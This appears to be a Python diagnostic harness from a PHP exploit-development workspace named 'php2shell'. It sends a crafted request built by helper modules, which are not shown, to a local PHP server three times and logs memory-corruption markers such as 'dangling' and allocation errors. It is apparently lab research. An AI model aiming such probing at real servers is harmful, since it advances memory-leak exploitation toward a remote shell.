#!/usr/bin/env python3
import hashlib, importlib.util, json, re, socket
from pathlib import Path

def load(n, p):
    s = importlib.util.spec_from_file_location(n, p)
    m = importlib.util.module_from_spec(s); s.loader.exec_module(m); return m

HERE = Path("/tmp/opencode/realapps/side/php2shell")
LEAK = load("l", HERE / "native-output-leak.py")
STOCK = load("s", HERE / "native-output-leak-stock-arm.py")
COMPACT = load("c", HERE / "compact-stock-tail.py")
host, port, path = "127.0.0.1", 28840, "/index.php"
header = f"{host}:{port}"; tmo = 60.0
body = STOCK.arm_body(b"abcdefgh", COMPACT.ARM_FILENAME_LENGTH)
req = LEAK.request_bytes(header, path, body, None, 23, False)
out = []
for i in (1, 2, 3):
    c = socket.create_connection((host, port), timeout=tmo); c.settimeout(tmo)
    c.sendall(req); r = LEAK.read_response(c.makefile("rb", buffering=0)); c.close()
    text = r[1]
    alloc = re.search(rb"tried to allocate (\d+) bytes", text)
    marks = {m.decode(): m in text for m in
             (b"cannot be changed", b"failed to open", b"dangling",
              b"Session ID is too long", b"Allowed memory")}
    row = {"run": i, "status": r[3], "body_bytes": len(text),
           "alloc_try": alloc.group(1).decode() if alloc else None,
           "markers": marks,
           "sha12": hashlib.sha256(text).hexdigest()[:12]}
    out.append(row); print(row)
(HERE / "runs" / "diag4_result.json").write_text(json.dumps(out, indent=2) + "\n")
